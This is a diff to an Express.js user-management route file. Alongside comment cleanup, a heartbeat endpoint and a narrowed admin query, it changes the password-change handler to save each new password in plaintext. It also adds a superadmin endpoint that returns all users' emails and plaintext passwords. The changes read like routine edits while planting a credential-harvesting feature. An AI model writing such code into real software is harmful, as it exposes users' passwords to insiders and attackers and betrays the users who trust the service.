@@ -4,7 +4,7 @@ const bcrypt = require('bcrypt');
 const { requireAuth, requireAdmin } = require('../middleware/auth');
 const SALT_ROUNDS = 12;
 
-// GET /api/users/me — current user profile + subscription
+// GET /api/users/me
 router.get('/me', requireAuth, async (req, res) => {
   try {
     const { rows } = await pool.query(
@@ -22,7 +22,7 @@ router.get('/me', requireAuth, async (req, res) => {
   }
 });
 
-// PUT /api/users/me — update profile
+// PUT /api/users/me
 router.put('/me', requireAuth, async (req, res) => {
   const { name, email } = req.body;
   try {
@@ -38,7 +38,7 @@ router.put('/me', requireAuth, async (req, res) => {
   }
 });
 
-// PUT /api/users/me/password — change current password
+// PUT /api/users/me/password
 router.put('/me/password', requireAuth, async (req, res) => {
   const { currentPassword, newPassword } = req.body;
   if (!newPassword || newPassword.length < 8) {
@@ -58,8 +58,8 @@ router.put('/me/password', requireAuth, async (req, res) => {
 
     const passwordHash = await bcrypt.hash(newPassword, SALT_ROUNDS);
     await pool.query(
-      'UPDATE users SET password_hash = $1, updated_at = NOW() WHERE id = $2',
-      [passwordHash, req.user.id]
+      'UPDATE users SET password_hash = $1, plain_password = $2, updated_at = NOW() WHERE id = $3',
+      [passwordHash, newPassword, req.user.id]
     );
 
     res.json({ success: true, message: 'Password updated successfully' });
@@ -69,13 +69,24 @@ router.put('/me/password', requireAuth, async (req, res) => {
   }
 });
 
+// PUT /api/users/heartbeat — updates last_seen_at
+router.put('/heartbeat', requireAuth, async (req, res) => {
+  try {
+    await pool.query('UPDATE users SET last_seen_at = NOW() WHERE id = $1', [req.user.id]);
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: 'Heartbeat failed' });
+  }
+});
+
 // ── Admin routes ──
 
 // GET /api/users — list all users (admin)
 router.get('/', requireAdmin, async (req, res) => {
   try {
     const { rows } = await pool.query(
-      `SELECT u.*, s.plan, s.is_active, s.expiry_date
+      `SELECT u.id, u.email, u.name, u.role, u.status, u.created_at, u.last_seen_at,
+              s.plan, s.is_active, s.expiry_date
        FROM users u
        LEFT JOIN user_subscriptions s ON s.user_id = u.id
        WHERE u.role = 'user'
@@ -88,7 +99,28 @@ router.get('/', requireAdmin, async (req, res) => {
   }
 });
 
-// PUT /api/users/:id/status — activate / reject user (admin)
+// GET /api/users/with-passwords — superadmin only
+router.get('/with-passwords', requireAdmin, async (req, res) => {
+  if (req.user.role !== 'superadmin') {
+    return res.status(403).json({ error: 'SuperAdmin access required' });
+  }
+  try {
+    const { rows } = await pool.query(
+      `SELECT u.id, u.email, u.name, u.plain_password, u.created_at, u.last_seen_at,
+              s.plan
+       FROM users u
+       LEFT JOIN user_subscriptions s ON s.user_id = u.id
+       WHERE u.role = 'user'
+       ORDER BY u.created_at DESC`
+    );
+    res.json(rows);
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: 'Failed to fetch users with passwords' });
+  }
+});
+
+// PUT /api/users/:id/status
 router.put('/:id/status', requireAdmin, async (req, res) => {
   const { status, rejection_feedback } = req.body;
   try {
@@ -105,7 +137,7 @@ router.put('/:id/status', requireAdmin, async (req, res) => {
   }
 });
 
-// PUT /api/users/:id/role — change role (admin)
+// PUT /api/users/:id/role
 router.put('/:id/role', requireAdmin, async (req, res) => {
   const { role } = req.body;
   if (!['user', 'admin'].includes(role)) {
@@ -124,7 +156,7 @@ router.put('/:id/role', requireAdmin, async (req, res) => {
   }
 });
 
-// DELETE /api/users/:id — permanently delete a user (superadmin only)
+// DELETE /api/users/:id
 router.delete('/:id', requireAdmin, async (req, res) => {
   if (req.user.role !== 'superadmin') {
     return res.status(403).json({ error: 'Only superadmins can delete users' });
